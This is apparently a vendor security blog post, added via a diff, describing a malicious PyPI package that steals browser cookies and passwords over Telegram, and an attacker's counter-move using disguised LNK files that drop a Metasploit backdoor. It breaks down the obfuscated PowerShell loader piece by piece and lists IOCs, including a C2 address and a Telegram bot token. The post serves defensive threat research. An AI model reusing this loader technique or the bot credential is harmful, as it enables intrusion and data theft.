@@ -1,0 +1,60 @@
+
+image: ../../Dataset/Image\checkmarx\20240824_195354_582788\SASTandDast_Blog.jpg
+image: ../../Dataset/Image\checkmarx\20240824_195354_582788\SASTandDast_Blog.jpg
+A cybersecurity researcher, delving into the depths of a malicious Python package, suddenly finds themselves in the crosshairs of the very hacker they were tracking. What starts as a pursuit of understanding harmful code evolves into a strategic battle of wits, where every move could either outsmart the attacker or fall into their trap.
+Introduction
+Targeting the open-source space in the software industry is trending among threat actors, not only because it represents one of the largest attack surfaces, but because it often escapes the vigilant eyes of organizations.
+Open-source package managers are especially enticing to Advanced Persistent Threats (APTs) and other malicious entities who often poison them with malicious packages and implement strategies ranging from manipulating build automation processes to skillfully deceiving developers into installing these compromised packages.
+The ramifications of such breaches are far-reaching and can have devastating consequences for any organization, regardless of its size. Therefore, it is essential to thoroughly vet every component or dependency in the supply chain
+Our research team recognizes the seriousness of these threats. To safeguard the open-source software ecosystem, we monitor popular public repositories like NPM and PyPi, just to name a few, to identify and eliminate any rogue packages or dependencies at the earliest stage.
+This story, however, takes an unexpected twist. when one of our researchers, while analyzing a malicious Python package named “testfiwldsd21233s” from the PyPi repository, found themselves in the crosshairs of the very threat actor they were investigating. What unfolded was not just an analysis of a cybersecurity breach, but a gripping tale of how the hunter became the hunted.
+But before we delve deep into the analysis of this incident, let’s take a step back to understand the background of the malicious package the researcher had been analyzing.
+Behavioral Analysis of Malicious Packagea
+In its entirety, the package is capable of targeting both Windows and Linux-based systems. If it detects that it is on a Windows NT host, it deploys a malicious executable. On the other hand, if it is on a Linux-based host, it leverages native Python code. In essence, it functioned as a data-stealing malware, systematically gathering sensitive information from web browsers, including but not limited to cookies and saved passwords, and saved this data into temporary files, which were then uploaded to transfer[.]sh. Finally, it would exfiltrate the host information along with a unique URL to download the stolen data from transfer[.]sh using a hardcoded Telegram bot API URL. Additionally, it would create a scheduled task on the system to maintain persistence.
+Driven by curiosity, the researcher wanted to examine the exfiltrated data and analyze it. The objective was to assess the scope of the malware’s impact, identify and locate potential victims, and explore the possibility of tracing the threat actor behind it.
+A Game of Cyber Cat & Mouse: The Researcher’s Countermove
+By utilizing a technique that enables the forwarding of all exfiltrated data through the Telegram bot API to the researcher’s personal Telegram chat, the researcher effectively managed to redirect all the stolen data from the threat actor’s chat to their own chat.
+Forwarding of  data from the threat actor’s Telegram chat to the researcher’s own chat
+The data forwarded by the bot included various host information, geo-location, and the link to download an encrypted file with a “.wsr” extension, which includes all the stolen cookies and passwords. Unfortunately, the files could not be decrypted for further analysis, and this is where we stopped our investigation.
+The Attacker Attempts To Strike Back
+However, after approximately a month, the researcher received a new notification about a new stolen record in the chat from the same Telegram bot.
+This raised suspicion because, unlike previous data, there was no “forwarded” tag attached to the new chat. And instead of an encrypted file with a “.wsr” extension, there was an unencrypted zip archive.
+Suspicious message received in telegram chat
+Upon downloading and decompressing the zip archive attached to the chat for further analysis, the following observations were made:
+the unarchived data contained multiple files with the “.lnk” extension, which in all the cases except for one, were also preceded by a second extension in the filename, which was “.txt”.
+The presence of these double extensions raised suspicion, particularly the “.lnk” extension, as LNK files are known to be shortcut files in the Windows OS that can potentially execute malicious code if clicked.
+The list of files with the “.lnk” extension, preceded by the txt extension
+Peeling Back Layers: Exposing a Backdoor Operation
+Upon analyzing these shortcut files using the “exiftool” command on a Linux machine, we discovered several important details.
+First, the “Icon File Name” property was set to the path “%windir%system32notepad.exe”, which caused the shortcut files to display the notepad icon. The use of the “.txt” extension in the filename now makes sense since MS Windows does not show the actual file extension in the explorer, and combined with the custom icon set for these subjected files, they appear like normal – benign text files.
+The second thing we learned was that the “Command Line Arguments” property was set to the following powershell command:
+Another thing to note is that all the shortcut files in the unarchived data except for the “Screen,jpg.lnk” had the exact same SHA-256 hash. they are, therefore, all the same malicious files. If any one of these files is opened, then the above malicious PowerShell command defined in the “Command Line Arguments” property will be executed.
+Here is a breakdown of the PowerShell command and its execution:
+
+“/c powershell -windowstyle hidden”: The complete command will be executed in a hidden window and will not be visible to the victim.
+“$lnkpath = Get-ChildItem .lnk ^| where-object {$_.length -eq 0x00117926} ^| Select-Object -ExpandProperty Name;”: Searches for a shortcut file (.lnk) in the current directory with a file size of 0x00117926 (in hex), this will result in any of the malicious shortcut files except for “Screen,jpg.lnk”, as they satisfy the file size criteria.
+
+“$file = gc $lnkpath -Encoding Byte”: The content of the file matching the criteria is then read and saved in the form of a byte array in the variable – “$file”.
+
+“for($i=0; $i -lt $file.count; $i++) { $file[$i] = $file[$i] -bxor 0x33 };”: Iterating over each byte stored in the byte array – “$file”, a bitwise XOR operation with the value 0x33 on each byte of the byte array.
+
+“$path = ‘%temp%tmp’ + (Get-Random) + ‘.exe’;”: Creates a new executable file in the temporary directory with a random name and “.exe” as its extension by skipping the first “2838” bytes of the previously modified byte array.
+
+“sc $path ([byte []] ($file ^| select -Skip 002838)) -Encoding Byte;”: Writes the XOR-ed byte array after skipping the first “2838” bytes, to the new “.exe” file.
+
+^& $path;”: Finally, runs the newly created executable.
+We then used a simple Python script as shown in the photo below, to extract the malicious executable from the “LNK” file. Additionally, the “file” command confirms that the extracted file is a 64-bit PE file for MS Windows, written in .NET framework, with the SHA-256 hash of “4cf48c2a3933ac4c6733533bf16d40fa4e411fbbf42b03d84d6c8df62e253ad0”.
+When it comes to the malicious executable, one option is to statically analyze it by decompiling it using a .NET Decompiler like ILSpy or dnSpy. However, in this particular case, we opted for dynamic analysis as it proved to be more efficient. Through this analysis, we made the following observations:
+This malicious executable has been identified as a backdoor created using the Metasploit framework. It communicates with a handler at the IP address “128[.]199[.]113[.]162”. The complete URL that the backdoor uses, accepting both GET and POST requests, is “hxxp[://]128[.]199[.]113[.]162/upwawsfrg[.]php”. This endpoint can be used for exfiltrating data as well as fetching other payloads for post-exploitation purposes.
+Furthermore, the processes invoked by the executable indicate that it also utilizes the Windows task scheduler to create a scheduled task on the compromised host. This task executes the executable itself every 5 minutes, serving as a persistence mechanism that allows the threat actor to maintain consistent remote access even after reboots.
+Conclusion
+From the above incident, it is clear that it was a carefully crafted attack, tailored with meticulous attention to detail. The threat actor behind this attack demonstrated a clear understanding of the context and situation. The use of fake Exil data was an impressive tactic, as it could have deceived the researcher into making a misstep resulting in a complete compromise.
+In light of this, individuals working in the cybersecurity industry need to be more vigilant. Attacks are becoming increasingly sophisticated day by day, and they are not limited to the average internet surfer.
+As part of the Checkmarx Supply Chain Security solution, our research team continuously monitors suspicious activities in the open-source software ecosystem. We track and flag “signals” that may indicate foul play and promptly alert our customers to help protect them.
+IOC
+
+hxxps[://]api[.]telegram[.]org/bot6021370805:AAFbCSlFairNgnxSj8mC6Wtf7PW5yGyWmcE
+128[.]199[.]113[.]162
+hxxp[://]128[.]199[.]113[.]162/upwawsfrg[.]php
+SHA-256 hash of LNK files – 273a75ba90251e317ed6291e6d4e31f80ce006e81bdc6582a4988078dc5610ef
+SHA256 hash of malicious executable – “4cf48c2a3933ac4c6733533bf16d40fa4e411fbbf42b03d84d6c8df62e253ad0”
